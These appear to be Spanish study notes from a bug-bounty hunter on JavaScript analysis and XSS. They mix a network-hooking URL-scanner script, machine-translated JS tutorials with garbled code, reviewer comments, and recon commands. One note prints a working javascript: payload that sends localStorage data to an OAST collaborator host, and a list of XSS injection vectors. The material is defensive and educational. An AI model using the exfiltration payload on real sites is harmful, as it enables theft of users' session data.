            if(ct.includes('application') || ct.includes('text') || ct.includes('json') || ct.includes('javascript') || ct.includes('xml')){
              const txt = await clone.text().catch(()=>null);
              if(txt) {
                // attempt to find matches inside body
                let m;
                while((m = regex.exec(txt)) !== null) addUrl(m[0], 'fetch.response');
              }
            }
          }
        } catch(e){}
        // register the requested url
        try {
          const url = (typeof input === 'string')? input: (input && input.url) || (init && init.url);
          if(url) addUrl(url,'fetch.request');
        } catch(e){}
        return resp;
      } catch(e){
        throw e;
      }
    };
    // XHR
    const XHR = window.XMLHttpRequest;
    function ProxyXHR(){
      const xhr = new XHR();
      const _open = xhr.open;
      xhr.open = function(method, url){
        addUrl(url, 'xhr.open');
        return _open.apply(xhr, arguments);
      };
      const _onload = xhr.onload;
      xhr.addEventListener('load', function(){
        try {
          const ct = xhr.getResponseHeader && xhr.getResponseHeader('content-type')||'';
          if(ct && (ct.includes('javascript') || ct.includes('json') || ct.includes('text') || ct.includes('xml'))) {
            const txt = xhr.responseText || null;
            if(txt){
              let m;
              while((m = regex.exec(txt)) !== null) addUrl(m[0],'xhr.response');
            }
          }
        } catch(e){}
      });
      return xhr;
    }
    window.XMLHttpRequest = ProxyXHR;
  }

  // Build fetch tasks for each unique url and attempt to read body
  async function fetchAll(){
    const toFetch = [];
    for (const [url, meta] of results.entries()){
      toFetch.push(async ()=>{
        // skip data: blob: about: etc
        if(url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('about:')) return;
        const res = await safeFetchText(url);
        if(res.ok && res.text) results.get(url).body = res.text.slice(0, 20000); // keep up to 20k chars
        else results.get(url).error = res;
      });
    }
    await pool(toFetch, concurrency);
  }

  // OUTPUT helpers
  function showOverlay(text){
    const existing = document.getElementById('__aquiles_js_scan_overlay');
    if(existing) existing.remove();
    const div = document.createElement('div');
    div.id = '__aquiles_js_scan_overlay';
    div.style.position = 'fixed';
    div.style.right = '10px';
    div.style.top = '10px';
    div.style.zIndex = 2147483647;
    div.style.maxHeight = '80vh';
    div.style.overflow = 'auto';
    div.style.background = 'rgba(0,0,0,0.85)';
    div.style.color = 'white';
    div.style.padding = '10px';
    div.style.fontSize = '12px';
    div.style.borderRadius = '8px';
    div.style.minWidth = '320px';
    div.innerHTML = text;
    const close = document.createElement('button');
    close.textContent = 'Close';
    close.style.display='block';
    close.onclick = ()=>div.remove();
    div.appendChild(close);
    document.body.appendChild(div);
  }
  function downloadText(name, content){
    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([content], {type:'text/plain'}));
    a.download = name;
    a.click();
    setTimeout(()=>URL.revokeObjectURL(a.href), 30000);
  }

  // MAIN
  try{
    scanDOM();
    hookNetwork();
    // small delay to let page possibly inject initial dynamic scripts
    await new Promise(r=>setTimeout(r, 1500));
    // build tasks to fetch discovered urls
    await fetchAll();

    // prepare output
    const lines = [];
    for (const [url, meta] of results.entries()){
      lines.push(`${url}  // sources: ${[...meta.sources].join(', ')}${meta.error ? ' // err:'+JSON.stringify(meta.error) : ''}`);
    }
    const out = lines.join('\n');
    if(outputMode === 'console') {
      console.log('JS scan results:', out);
      alert('Scan finished: revisá la consola (console.log).');
    } else if(outputMode === 'overlay'){
      showOverlay('<pre style="white-space:pre-wrap; max-width:700px;">' + escapeHtml(out).slice(0,20000) + '</pre>');
    } else if(outputMode === 'download'){
      downloadText('js-scan-results.txt', out);
      alert('Archivo generado: js-scan-results.txt');
    } else if(outputMode === 'document'){
      document.open(); document.write('<pre>'+escapeHtml(out)+'</pre>'); document.close();
    }
  } catch(e){
    console.error('Scan failed', e);
    alert('Scan failed: '+String(e));
  }

  // Escape helper
  function escapeHtml(s){
    return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

})();
nada interesante.
pues solo la regla regex de api generica nada mas la img.
Por qué JavaScript necesita atributos HTML
JavaScript interactúa con HTML a través del DOM (Modelo de Objetos del Documento) . Para conectarse dinámicamente con elementos HTML, JS necesita elementos con atributos identificables .

<button>➜ Se utiliza para realizar acciones
✅ Atributos:
id: Identificador único
class:Se utiliza para CSS y JS
onclick:Ejecuta directamente una función JS cuando se hace clic
disabled: Desactiva el botón
🔹 Ejemplo:
<button id = "myBtn" onclick = "sayHi()" >Haz clic en mí</button>
función sayHi () { 
  alerta ("¡Hola!"); 
}
2. <input>➜ Para texto, casillas de verificación, contraseñas, etc.
✅ Atributos:
type: Especifica el tipo (texto, contraseña, etc.)
id,class
onchange, oninput, onfocus, onblur: Ganchos de eventos JS
value: Valor de entrada
🔹 Ejemplo:
< tipo de entrada  = "texto" id = "nombre de usuario" oninput = "checkName()" /> 
función  checkName ( ) { 
  const nombre = document.getElementById ( " nombre de usuario" ) . valor ; console.log ( " El usuario escribió:" , nombre); }
  
3. <form>➜ Envuelve los campos de entrada
✅ Atributos:
onsubmit: Validación de JS
action:Dónde se envían los datos
method: OBTENER o PUBLICAR
id,class
🔹 Ejemplo:
<form id = "loginForm" onsubmit = "return validateForm()" > 
  <input type = "text"  id = "user" /> 
  <button type = "submit" >Iniciar sesión</button> 
</form>
función  validateForm ( ) { 
  const u = document.getElementById ( "usuario" ) . value ; if (u === '' ) { alert ( " Se requiere nombre de usuario" ); return false ; // Evitar el envío del formulario   } return true ; }
  
    
     

   
4. <a>(Etiqueta de ancla) 🔗
✅ Atributos:
href: Destino del enlace
onclick:Intercepta clics para un comportamiento JS personalizado
id,class
🔹 Ejemplo:
< a  href = "#"  onclick = "loadMore()" > Cargar más </ a >
función loadMore () { 
  alerta ("Cargando contenido..."); 
}
5. <select>& <option>▼ Menús desplegables
✅ Atributos:
onchange:Se activa cuando cambia la selección
id, value,class
🔹 Ejemplo:
< select  id = "colorPicker"  onchange = "changeColor()" > 
  < valor de la opción  = "rojo" > Rojo </ opción > 
  < valor de la opción  = "azul" > Azul </ opción > 
</ select >
función  changeColor ( ) { 
  const color = document.getElementById ( " colorPicker " ) . value ; 
  document.body.style.backgroundColor = color ; }​
6. <img>📸 Imagen
✅ Atributos:
src, alt, id,class
onclick:Se utiliza para la funcionalidad de caja de luz/galería
🔹 Ejemplo:
<img src= "cat.jpg"  id = "catPic" onclick= "zoomIn(esto)" />
función  zoomIn ( img ) { 
  img.style.width = " 500px " ; 
}
7. <div>/ <span>➜ Contenedores
✅ Atributos:
id, class, onclick, onmouseover,onmouseout
🔹 Ejemplo:
<div id = "box" onclick= "changeText()" >Haz clic en mí</div>
función  changeText ( ) { 
  document.getElementById ( "box" ) . innerText = "¡Cambiado! " ; }
8. <label>📄 &<textarea>
✅ Atributos:
for: Vincula la etiqueta a la entrada
oninput, onchangepara<textarea>
🔹 Ejemplo:
< etiqueta  para = "msg" > Mensaje: </ etiqueta > 
< área de texto  id = "msg"  oninput = "countChars()" > </ área de texto >
función  countChars ( ) { 
  const len ​​= document.getElementById ( "msg" ) . value.length ; console.log ( " Caracteres escritos:" , len) ; }
  
Bono: Uso de data-*atributos
Los atributos de datos personalizados son una forma poderosa de adjuntar información personalizada a los elementos.

🔹 Ejemplo:
< div  data-user-id = "42"  onclick = "loadUser(this)" > Información del usuario </ div >
función  loadUser ( elem ) { 
  const id = elem.getAttribute ( "data-user-id" ); 
  console.log ( " Cargando usuario con ID:" , id); }
¿Qué es un “Contexto de Ejecución”?
Un contexto de ejecución es el entorno en el que se ejecuta el código JavaScript . Cada vez que se ejecuta un script, se crea uno.

Piense en ello como una caja donde las variables, funciones y thispalabras clave residen temporalmente mientras se ejecuta el código.

🔥 Todos los tipos comunes de contextos de ejecución de JavaScript
1. Contexto de ejecución global (GEC)
Se crea cuando se carga el archivo o la página JavaScript.
Sólo uno por programa.
Crea el objeto global ( windowen el navegador, globalen Node.js).
Ejemplo:

var x = 10 ; función saludo  ( ) {    console.log ( " Hola" ); }
2. Contexto de ejecución de la función
Se crea cada vez que se llama una función.
Cada llamada de función crea su propio contexto nuevo.
Almacena argumentos, variables locales y alcance.
Ejemplo:

función  sayHi ( nombre ) {    var saludo = "Hola " + nombre;    console.log (saludo); } sayHi ( " Alice" ); // nuevo contexto de ejecución creado
3. Contexto de ejecución de la evaluación (raro y peligroso)
Se crea cuando se ejecuta el código dentro de eval().
Puede acceder al ámbito local si evalse utiliza directamente.
Peligroso y desanimado.
Ejemplo:

evaluación ( "var z = 100;" ); consola . iniciar sesión (z); // 100
🕳️ “Puntos” de ejecución de JavaScript no estándar o complicados
Estos no son “contextos de ejecución” formales, sino lugares donde se ejecuta el código JS :

4. Controladores de eventos ( onclick, onerror, etc.)
Código en línea en HTML:
< button  onclick = "alert('¡Hizo clic!')" > Clic </ button >
5. Temporizadores
El código se ejecuta en su propio contexto cuando se activa el temporizador.
setTimeout(() => { alert("Delayed alert"); }, 1000);

6. javascript:URL
La ejecución ocurre cuando el usuario hace clic en el enlace.
< a  href = "javascript:alert('XSS')" > Haga clic </ a >
7. <script>Etiquetas
El código dentro de a <script>se ejecuta en el contexto global.
< script > alerta ( "Ejecutando en contexto global" ) </ script >
8. Ejecución dinámica de código:
Usando eval(), new Function(), osetTimeout('...')
eval ( "alert('Eval!')" ); new  Function ( "alert('¡Constructor de función!')" )(); setTimeout ( "alert('De cadena')" , 1000 );
9. <iframe srcdoc>o scripts en línea en marcos aislados
Estos crean un nuevo contexto pero pueden aislarse.
<iframe srcdoc="<script>alert('iframe')</script>"></iframe>

10. Trabajadores de servicio/Trabajadores web
Tienen su propio contexto aislado, separado del DOM.

11. Interoperabilidad entre WebAssembly y JS
JS se ejecuta en su propio contexto, pero puede interactuar con código compilado.
🔐 Consejo de seguridad
La mayoría de los ataques XSS tienen como objetivo secuestrar uno de estos puntos de ejecución inyectando:

Controladores de eventos en línea ( onerror, onclick)
Guiones
javascript:URL
Evaluación dinámica peligrosa comoeval()
Estas son funciones proporcionadas por el entorno del navegador (no el lenguaje JavaScript central): permiten que sus scripts interactúen con los usuarios, controlen la página y se comuniquen con el navegador.

Los agruparemos de la siguiente manera:

✅ Funciones de interacción del usuario
🪟 Funciones de control de ventanas
⏱️ Temporizadores (Retraso/Repetición)
📍 Funciones de ubicación (URL/Redireccionamiento)
📤 Funciones de red (Fetch / Ajax)
Funciones DOM (modelo de objetos de documento)
🧠 Funciones de almacenamiento (Almacenamiento local / Almacenamiento de sesión)
Funciones de pantalla y navegador
Funciones del evento


JavaScript + Browser te da el poder de:

Hablar con los usuarios ( alert, prompt)
Moverse por las páginas ( location)
Tiempo de manejo ( setTimeout, setInterval)
Trabajar con la página ( DOM)
Almacenar datos ( localStorage)
Hacer AJAX ( fetch)
Reaccionar a los clics, desplazamientos, escritura, etc.
En HTML , un atributo es algo que se coloca dentro de una etiqueta para configurarlo.

En JavaScript , a menudo leemos o cambiamos estos atributos utilizando métodos DOM, especialmente en elementos HTML.

Los atributos de evento de JavaScript son atributos HTML que son pares clave-valor que se definen dentro de los elementos HTML para activar eventos dentro de los códigos JavaScript.

Así que decimos:

Los elementos HTML tienen atributos como src, href, id, type, etc.
JavaScript nos permite obtener , establecer o eliminar esos atributos dinámicamente.
✅Eljavascript:
El esquema URI es un tipo especial de URL que le permite ejecutar código JavaScript en línea directamente desde lugares que aceptan URL, como un enlace ( <a>) o una acción de formulario.

Cuando veas esto en una <a>etiqueta:

< a  href = "javascript:alert(1)" > Haz clic en mí </ a >
Le está diciendo al navegador:

"Oye, en lugar de ir a un sitio web como http://example.com, ejecuta algún código JavaScript".

Por eso es una URL , aunque no vaya a un servidor: solo ejecuta código en el contexto de la página actual.

✅ Cómo javascript:funciona enhref
La mayoría de las personas están familiarizadas con href="https://...", pero hreftambién pueden señalar otros protocolos , como:

mailto:someone@example.com
tel:+123456789
javascript:← esta es clave
📌 javascript:es un protocolo compatible con el navegador
Cuando un usuario hace clic en un enlace con href="javascript:...", el navegador ejecuta el código JavaScript que sigue.

🔥¿Cómo funciona?
Al hacer clic en ese enlace, el navegador lo ve href="javascript:..."y ejecuta el código JavaScript que lo sigue.



Entonces:

< a  href = "javascript:alert(1)" > Haz clic en mí </ a >
➡️ Al hacer clic se ejecuta:

alerta ( 1 );
🤯 Ejemplo del mundo real
Digamos que visitas una página como ésta:

http://victim.com/level5/frame/signup?next=javascript:alert(1)
Y esa página tiene:

< a  href = "{{ next }}" > Siguiente >> </ a >
Esto se convierte en:

< a  href = "javascript:alert(1)" > Siguiente >> </ a >
Cuando el usuario hace clic en “Siguiente >>”, no navega a una nueva página , simplemente se ejecuta alert(1)directamente en su navegador.

¡Boom! Eso es XSS reflejado.

🧠¿Por qué se llama “URL”?
Porque técnicamente es una URL , pero no una que conduce a un archivo o una página web: es un “contexto de ejecución de JavaScript” .

Piénsalo de esta manera:

URL normal https://example.com→ Carga una página web

javascript:alert(1)→ Ejecuta código JavaScript

El navegador lo maneja como cualquier otro esquema ( http:, mailto:, ftp:, etc.), excepto que en lugar de recuperar un recurso, ejecuta el código .

🔐 ¿Por qué es esto peligroso?
javascript:Los enlaces se ejecutan con los mismos privilegios que la página original.
Los atacantes pueden robar cookies , realizar acciones en nombre de los usuarios o manipular el DOM.
🛑 Dónde está bloqueado o restringido:
Los navegadores modernos a menudo bloquean javascript:las URL en:

La barra de direcciones (algunas páginas)
Adentro<iframe src="javascript:...">
Sitios con encabezados CSP fuertes
Las funciones integradas son funciones predefinidas en JavaScript que puedes usar de inmediato, sin necesidad de definirlas tú mismo.

Vienen de:

El lenguaje JavaScript en sí
El entorno del navegador (como alert, prompt, etc.)
Objetos como Math, Array, String, etc.
📚 Categorías de funciones integradas
Exploraremos las funciones integradas de:

📢 Funciones del navegador
Funciones matemáticas
Funciones de cadena
Funciones de matriz
📅 Funciones de fecha
🔧 Funciones de verificación/conversión de tipos
1️⃣ 📢 Funciones del navegador
alert()Muestra una alerta emergente

prompt()Muestra un cuadro de texto y obtiene la entrada del usuario.

confirm()Muestra una ventana emergente Sí/No, devuelve verdadero/falso

console.log()Imprime en la consola del navegador

alert ( "¡Hola!" ); 
let name = prompt ( "¿Cuál es tu nombre?" ) ; 
let ok = confirm ( " ¿Estás seguro?" ); 
console.log ( "El usuario dijo:" , ok);
2️⃣ 🧮 Funciones matemáticas
JavaScript proporciona un objeto integrado Math:

Descripción de la función Math.round(x)Redondea al entero más cercano

Math.ceil(x)Redondeos

Math.floor(x)Redondea hacia abajo

Math.random()Número aleatorio (0 a <1)

Math.max(a,b)Devuelve el número más alto

Math.min(a,b)Devuelve el número más bajo

Math.pow(a,b)a elevado a b

Math.sqrt(x)Raíz cuadrada

consola.log ( Math.round ( 4.6 ) );   // 5 consola.log ( Math.random ( ) ) ;    // p . ej . 0.38289 consola.log ( Math.pow ( 2 , 3 ))   ; // 8

3️⃣ 📜 Funciones de cadena
Estos son para manipular texto:

lengthObtiene la longitud de la cadena

toUpperCase()Convierte a mayúsculas

toLowerCase()Convierte a minúsculas

charAt(index)Obtiene el carácter en una posición includes("text")Comprueba si la cadena contiene texto indexOf("text")Encuentra la posición del texto slice(start, end)Corta una parte de la cadena replace("a", "b")Reemplaza el texto trim()Elimina los espacios del inicio y del final split("separator")Se divide en una matriz

let msg = " Hola Mundo" ; 
console.log (msg.trim ( ) ) ;              // "Hola Mundo" console.log 
( msg.toUpperCase ( ));       // " HOLA MUNDO" console.log (msg.includes ( " Mundo" ));   // verdadero console.log ( msg.charAt ( 1 ));           // "H"

4️⃣ 📦 Funciones de matriz
push(item)Añade elemento al final

pop()Elimina el último elemento

shift()Elimina el primer elemento

unshift(item)Añade elemento al inicio

lengthDevuelve el número de elementos

join(",")Convierte una matriz en una cadena

concat(arr)Une matrices

slice(start, end)Obtiene parte de la matriz

splice(start, count)Elimina/añade elementos

indexOf(item)Encuentra el índice del artículo

includes(item)Comprueba si la matriz tiene un elemento

forEach()Recorre la matriz

map()Crea una nueva matriz con valores modificados

ilter()Filtra elementos según su condición

reduce()Reduce la matriz a un único valor

let fruits = [ "manzana" , "plátano" , "mango" ]; 
fruits.push( "naranja" );      // [ "manzana" , "plátano" , "mango" , "naranja" ] 
fruits.pop();               // elimina "naranja"
 fruits.forEach( f => console.log(f)); // repite todo
5️⃣ 📅 Funciones de fecha
let now =  new  Date ( ); 
console.log ( now.toString ( ));        // fecha y hora completas console.log  ( now.getFullYear ());    // año console.log ( now.getMonth ( ) );       // mes ( 0 = ene . ) console.log (now.getDate());        // día del mes console.log (now.getHours() ) ;       // hora   
 
  
  
 
6️⃣ 🔧 Comprobación/Conversión de tipos
typeof xDevuelve el tipo de una variable

parseInt("123")Convierte una cadena en un entero

parseFloat("3.14")Convierte cadena en flotante

Number("5")Convierte a número

String(123)Convierte en cadena

isNaN(x)Comprueba si el valor no es un número

sea ​​x = "123" ; 
console.log ( typeof x);         // "string" console.log ( Number ( x));        // 123 console.log ( isNaN ( " abc " ));     // true
en resumen usar .value lo trata como texto.

 Código en cuestión:
documento . getElementById ( "consulta" ). valor = userInput;
🧠 Qué hace esto:
document.getElementById("query")
→ Selecciona el <input>elemento con id="query".
.value = userInput
→ Establece el valor del campo de entrada , de la siguiente manera:
<input id="query" value="userInput">
Pero en lugar de generar código HTML, lo hace de forma segura a través del DOM .
🔐 Por qué es seguro contra XSS:
Cuando se asigna una entrada de usuario a .value, JavaScript la trata como texto simple , no como código .

✨ Ejemplo:
userInput = ' < script > alerta ( "XSS" ) </ script > '; 
document.getElementById("consulta").value = userInput;
El navegador no ejecutará el script.
En su lugar, el cuadro de entrada mostrará literalmente:

< script > alerta ( "XSS" ) </ script >
Porque .valuesimplemente coloca la cadena en el cuadro de entrada, no la interpreta ni la ejecuta como código.

❌ Alternativa insegura (solo para contrastar):
documento . getElementById ( "consulta" ). internalHTML = entrada de usuario;
Si userInput = '<script>alert("XSS")</script>'esto sucede, se inyecta un script real que el navegador ejecuta .

✅ Resumen: ¿Por qué .valuees seguro?
Utiliza el DOM: interactúa con la estructura del elemento, no con la fuente HTML.

Se trata como texto: El valor no se analiza como HTML ni JS.
Sin interpretación: El navegador no ejecuta lo asignado a .value.
resumen, uso del protocolo javascrypt url en donde se puede utilizar.

✅ Lugares comunes que aceptan javascript:URL
1. 🧷<a href="javascript:...">
El ejemplo más clásico.
< a  href = "javascript:alert('XSS')" > Haz clic en mí </ a >
2. 🔘<area href="javascript:...">
Se utiliza dentro de <map>mapas de imágenes.
< nombre del mapa  = "mi mapa" > 
  < forma del área  = "rect" coordenadas = "34,44,270,350" href = "javascript:alert('XSS')" alt = "prueba" >    
</ mapa >
3. 🧾<form action="javascript:...">
Cuando se envía el formulario, se ejecuta JS.
< form  action = "javascript:alert('XSS')" > < 
  input type  = "  submit " value = "Go" > 
</form>
4. 📌<iframe src="javascript:...">
Generalmente está bloqueado en los navegadores modernos, pero anteriormente era explotable.
< iframe  src = "javascript:alert('XSS')" > </ iframe >
5. 🎨<link href="javascript:...">
Generalmente ya no funciona en los navegadores modernos debido a CSP y sandboxing, pero vale la pena mencionarlo para completarlo.
6. 🎬<script src="javascript:...">
No está permitido , pero esto es un error . Los navegadores javascript:lo rechazan src, aunque algunos navegadores antiguos podrían analizarlo.
7. 🪞 Métodos de la API DOM
Puedes usar javascript:en JS para interacción dinámica:

ventana.ubicación = "javascript:alerta('XSS')" ; 
ubicación.href = "javascript:alerta('XSS')" ;
⚠️ Contextos más complicados que pueden usarse indirectamentejavascript:
8. 🔁 Parámetros de redirección
Si una aplicación redirecciona en función de una cadena de consulta, por ejemplo next=javascript:alert(1), y la inserta sin sanear en un href, puede generar un XSS.

< a  href = "{{ next }}" > Haga clic en </ a >
Aporte:?next=javascript:alert(1)

9. 🧪 Marcadores
Los usuarios pueden ingresar manualmente una javascript:URL en la barra de direcciones (como un marcador), aunque la mayoría de los navegadores ahora bloquean esto a menos que sea un marcador.

javascript: alerta (documento.cookie)
10. 🧱 Inyección de InnerHTML
Puedes inyectar elementos con javascript:atributos a través de una manipulación DOM vulnerable.

elemento.innerHTML = '<a href="javascript:alert(1)">Clic</a>' ;
11. ⚙️ url()Funciones CSS (⚠️ rara vez funcionan)
Algunos navegadores muy antiguos o con errores podrían analizar url("javascript:...")CSS.

div { 
  imagen-de-fondo : url ( "javascript:alert('XSS')" ); 
}
12. 📱 Vistas web móviles
javascript:Es posible que las URL aún funcionen en los navegadores integrados de las aplicaciones móviles , donde los desarrolladores olvidaron deshabilitar o desinfectar los eventos de navegación.

🛡 Cómo se defienden los navegadores contra javascript:el ahora
Navegadores modernos:

Bloqueo javascript:en muchos atributos ( src, hrefde enlaces de orígenes no confiables, etc.).
Hacer cumplir la política de seguridad de contenido (CSP) .
Desinfecte o rechace la navegación javascript:si no se escribe directamente.
1. ¿Qué es JavaScript?
JavaScript es un lenguaje de scripting del lado del cliente que se ejecuta en el navegador . Se utiliza para añadir interactividad, como:

Ventanas emergentes
Deslizadores
Validación de formulario
Actualizaciones de contenido en vivo
¡Juegos, animaciones y más!
📦 2. Cómo usar JavaScript
🔸 Opción 1: En línea (no recomendado para scripts grandes)
< button  onclick = "alert('¡Hola!')" > Haz clic en mí </ button >
🔸 Opción 2: En <script>Etiqueta
<!DOCTYPE html > 
< html > 
< head > < title > Mi página JS </ title > </ head > 
< body > 
  < script > 
    alert("¡Hola desde dentro de la etiqueta script!"); 
  </ script > 
</ body > 
</ html >
🔸 Opción 3: Archivo externo (mejor práctica)
Crear un script.js:

console.log ( "¡Hola desde un archivo JS externo!" );
Enlazalo en HTML:

< script  src = "script.js" > </ script >
✨ 3. Sintaxis de JavaScript
✅ Variables
let name = "John" ;      // se puede cambiar 
const age = 30 ;         // valor constante 
var city = "London" ;    // forma antigua (no recomendada)
✅ Tipos de datos
Cadena"Hello"

Número 123,3.14

Booleano true,false

resumen de que es js etc.

Formación[1, 2, 3]

Objeto{name: "John", age: 30}

Nulonull

Indefinidoundefined

🧠 4. Funciones
función  saludar ( nombre ) { 
  console.log ( "Hola, " + nombre); }
greet("Alice"); // Salida: Hola, Alice
🔄 5. Condicionales
sea ​​edad = 20;
si (edad >= 18) { 
  console.log("Adulto"); 
} de lo contrario { 
  console.log("Menor"); 
}
🔁 6. Bucles
🔹 forbucle
para ( sea i = 0 ; i < 5 ; i++) { console.log 
  ( " Número: " + i); }
🔹 whilebucle
deje que count = 0 ; 
mientras (count < 3 ) { console.log 
  ( " Count: " + count);   count++; }

📦 7. Matrices
deje que frutas = [ "Manzana" , "Plátano" , "Mango" ];
console.log(fruits[0]); // Manzana 
fruits.push("Naranja"); // Añadir nuevo elemento
🧱 8. Objetos
let usuario = { 
  nombre: "Alice" , 
  edad: 25, 
  ciudad: "París"
 };
console.log(usuario.nombre); // Alice
📞 9. Eventos
< button  onclick = "sayHi()" > Haz clic en mí </ button >
<script> 
  función sayHi() { 
    alert("¡Hola!"); 
  } 
</script>
🔗 10. Manipulación del DOM (Páginas web dinámicas)
< p  id = "mensaje" > Hola </ p > 
< button  onclick = "changeText()" > Cambiar </ button >
<script> 
  function changeText() { 
    document.getElementById("mensaje").innerText = "¡Texto cambiado!"; 
  } 
</script>
🧪 11. Consola
Utilice esto en las herramientas de desarrollo de su navegador ( F12):

console.log ( "Esto se muestra en la consola" ); console.error ( "¡Error!" ) ; console.warn ( " ¡Advertencia ! " ) ;
sitio web interesante tool. https://cyscan.io/
nada interesante.
nada interesante
sobre un xss almaceado que lo descubrio luego del analisis previo de un punto final en un js pero con httponly en las cookies etc en fin lo movio para xss blin exfiltracion de data de localstroage que contenia info delicada etc a su servidor.

<a href="javascript:var match=JSON.stringify(localStorage).match(/ZNavIdentity\.userId=[^&]+&currEntityId=[^&]+/);if(match)fetch('https://#collab.oastify/?cookie='+encodeURIComponent(match[0]))">ttt</a>
nada nuevo.
nada nuevo.
Estoy usando una extensión de Firefox llamadaEmbellecer javascript

Embellece el código cuando visitas un archivo .js.
nada interesante.
Uno de los primeros pasos para detectar vulnerabilidades XSS es revisar el código para detectar cualquier caso en el que la entrada del usuario se renderice directamente en el DOM. En React, esto suele ocurrir al usar la dangerouslySetInnerHTMLpropiedad. Si bien esta función puede ser útil para renderizar contenido HTML, también puede suponer importantes riesgos de seguridad si no se gestiona correctamente. A continuación, se muestra un ejemplo de cómo se puede usar incorrectamente esta propiedad:

Copiar
const UserComment = ({ comment }) => {
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
};
En este ejemplo, si la commentpropiedad contiene scripts maliciosos, se ejecutarán en el navegador del usuario. Para mitigar este riesgo, depure siempre la entrada del usuario antes de renderizarla. Bibliotecas como DOMPurifypueden ayudarle a depurar contenido HTML de forma segura. Así es como puede implementarlo:

Copiar
import DOMPurify from 'dompurify';

const UserComment = ({ comment }) => {
  const cleanComment = DOMPurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: cleanComment }} />;
};
Otra área común para buscar vulnerabilidades XSS son los formularios que aceptan comentarios de los usuarios. Asegúrese de validar y depurar todos los campos de entrada. Por ejemplo, si tiene un formulario que acepta comentarios de los usuarios, debe validar la entrada para asegurarse de que no contenga scripts dañinos. A continuación, se muestra un ejemplo sencillo de cómo gestionar el envío de formularios de forma segura:

Copiar
const handleSubmit = (event) => {
  event.preventDefault();
  const userInput = event.target.elements.comment.value;
  const cleanInput = DOMPurify.sanitize(userInput);
  // Proceed to submit cleanInput to your server
};
Además de las revisiones de código, el uso de herramientas automatizadas puede ser de gran ayuda para identificar vulnerabilidades XSS. Herramientas como OWASP ZAP y Burp Suite pueden analizar su aplicación en busca de problemas de seguridad comunes, incluyendo XSS. Estas herramientas simulan ataques a su aplicación y generan informes detallados sobre posibles vulnerabilidades. Ejecutar estos análisis regularmente durante el proceso de desarrollo puede ayudar a detectar problemas de forma temprana.

Además, considere implementar encabezados de Política de Seguridad de Contenido (CSP) en su aplicación. La CSP es una función de seguridad que ayuda a prevenir ataques XSS al especificar qué fuentes de contenido son confiables. Al definir una CSP estricta, puede limitar la ejecución de scripts solo a aquellos que haya permitido explícitamente. A continuación, se muestra un ejemplo de cómo configurar un encabezado CSP básico en la configuración de su servidor:

Copiar
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-scripts.com;
Este encabezado le indica al navegador que solo ejecute scripts del mismo origen y desde trusted-scripts.com, lo que reduce efectivamente el riesgo de ataques XSS.

Por último, es fundamental mantenerse informado sobre las últimas prácticas y vulnerabilidades de seguridad.
Consulta regularmente las actualizaciones de la comunidad de React y sigue las mejores prácticas para una programación segura. Participar en foros y recursos centrados en la seguridad puede proporcionarte información valiosa y mantenerte al día sobre las amenazas emergentes.

Identificar y mitigar vulnerabilidades XSS en aplicaciones React JS es un proceso continuo que requiere diligencia y medidas proactivas. Al revisar su código, depurar la entrada de los usuarios, utilizar herramientas automatizadas, implementar CSP y mantenerse informado, puede mejorar significativamente la seguridad de sus aplicaciones web. Recuerde que una aplicación segura no solo protege a sus usuarios, sino que también genera confianza y credibilidad en su marca.
nada interesante.
Herramientas de desofuscación :

JSNice : una herramienta en línea que embellece y desofusca el código JavaScript, haciéndolo más legible.
Beautify.js : un embellecedor de JavaScript que formatea el código minimizado para facilitar su análisis.

 Desofuscar el código
El embellecimiento mejora la legibilidad, pero no soluciona la ofuscación, donde los nombres de variables y funciones se ocultan intencionalmente. Herramientas como JSNice pueden ayudar a desofuscar este tipo de código al predecir nombres más significativos.

Usando JSNice a través de la línea de comandos :
Aunque JSNice ofrece una interfaz web, también puedes usarla programáticamente. Aquí te explicamos cómo hacerlo curl:
Copiar
curl -X POST -s --data-binary @beautified_script.js "http://jsnice.org/beautify?pretty=1&rename=1&types=1" -o deobfuscated_script.js
Este comando envía a beautified_script.jsJSNice para su procesamiento y guarda el código desofuscado como deobfuscated_script.js.

Banderas :

pretty=1:Garantiza que la salida esté formateada (embellecida).
rename=1:Permite cambiar el nombre de las variables a nombres más significativos.
types=1:Intenta inferir y anotar tipos de variables.
resumen de que se puede hacer y enconcontrar en js poco basico pero esta bien.

Tabla de contenido:
Comprender JavaScript en el contexto de la seguridad
Configuración de su entorno
JavaScript básico para hackers
Escribiendo tu primer guión
Usando la consola
4. Explotación de XSS (Cross-Site Scripting)

¿Qué es XSS?
Ejemplo de ataque XSS
Evitar filtros
5. Manipulación del DOM para pruebas de seguridad

Interactuar con el DOM (Modelo de objetos de documento)
Explotación de JavaScript inseguro en sitios web
6. Phishing con JavaScript

Creación de formularios de inicio de sesión falsos
Recopilación de la entrada del usuario
7. JavaScript para el raspado y reconocimiento web

Uso de JavaScript para automatizar la recopilación de datos
8. JavaScript en ataques de red

Envío de solicitudes HTTP desde el navegador
9. Vulnerabilidades comunes de JavaScript

Inseguroeval()
Deserialización insegura
10. JavaScript avanzado: Explotación del código del lado del servidor

Exploits de Node.js
Explotación de API inseguras
nada interesante.
pues solo explica por arriba un poco si dominas algo de js y como sanitiza los diferentes fremor etc pero nada de otro mundo.
impresionante encontro un panel logyn aparentemente sin ningun camino y resulto que estaba construido con react y node.js y analizo un poco los archivos js en busqueda palabras claves etc y encontro login un logica probo mutaciones y operaciones necesarias en GraphQL cambio admin administrador y entro etc tenia disponible todos los metodos http get pos delet upgrade etc .
Nada nuevo, lo unico es la tool para sacar los archivos .js de cada sub-domain https://github.com/003random/getJS problema que veo a hacerlo con esta tool,  te estarias limitando mucho me refiero que estarias dejando de lado tool como waybacurls que son super potente y ademas se dipersa mucho el enfoque mejor ir por cada subdomain, y aplicar la metodologia completa a cada archivo .js de cada sub-domain asi confirmas y completas de manera correcta el analisis completa y detallado.Unico interesante seria la opcion de Nucley para sacar mas info de .js : nuclei -l js.txt -t ~/nuclei-templates/exposures/
Interesante, katana -list subdomains_alive.txt -d 2 -jc -silent | grep -E '\.js([?#].*)?$' | sort -u > live_katana_js.txt
 comando de katana opcion para extraer .js 
otro comando para linkfinder -i https://www.example.com -d -o cli | sort -u | tee linkfinder_raw.txt
